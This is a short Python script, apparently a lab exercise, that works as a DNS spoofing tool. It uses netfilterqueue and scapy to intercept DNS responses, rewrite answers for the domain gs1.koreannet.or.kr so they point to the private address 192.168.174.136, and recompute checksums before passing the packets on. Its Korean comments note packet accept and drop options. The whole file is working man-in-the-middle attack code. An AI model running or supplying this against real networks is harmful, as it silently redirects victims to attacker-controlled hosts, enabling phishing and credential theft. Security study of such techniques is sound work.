import netfilterqueue
import scapy.all as scapy
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "gs1.koreannet.or.kr" in qname.decode():
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname.decode(), rdata="192.168.174.136")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))

    packet.accept() #들어오는 패킷에 대해서 수락함.
    # packet.drop() # 들어오는 패킷에 대해서 거부함.

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
